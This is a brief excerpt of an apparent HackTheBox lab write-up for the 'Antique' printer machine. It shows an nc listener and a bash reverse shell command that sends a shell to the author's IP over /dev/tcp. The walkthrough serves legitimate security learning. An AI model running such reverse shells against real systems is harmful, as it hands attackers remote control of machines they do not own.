[HTB: Antique](/2022/05/03/htb-antique.html)

![Antique](https://0xdfimages.gitlab.io/img/antique-cover.webp)
...
[![Antique](/icons/box-antique.webp)](https://hackthebox.com/machines/antique)

[Antique](https://hackthebox.com/machines/antique)
...
My go-to reverse shell is bash (see [this video](https://www.youtube.com/watch?v=OjkVep2EIlw) on how it works). Given this is a printer, I’ll check if `bash` is on the box, and it is:
...
I’ll start `nc` listening on my host using `nc -lnvp 443`, and the run the reverse shell on Antique, `exec bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'`. It just hangs, but at `nc` there’s a shell:
...
![image-20220502093143737](https://0xdfimages.gitlab.io/img/image-20220502093143737.webp)
...
![image-20220502100304702](https://0xdfimages.gitlab.io/img/image-20220502100304702.webp)
...
![image-20220502100408767](https://0xdfimages.gitlab.io/img/image-20220502100408767.webp)
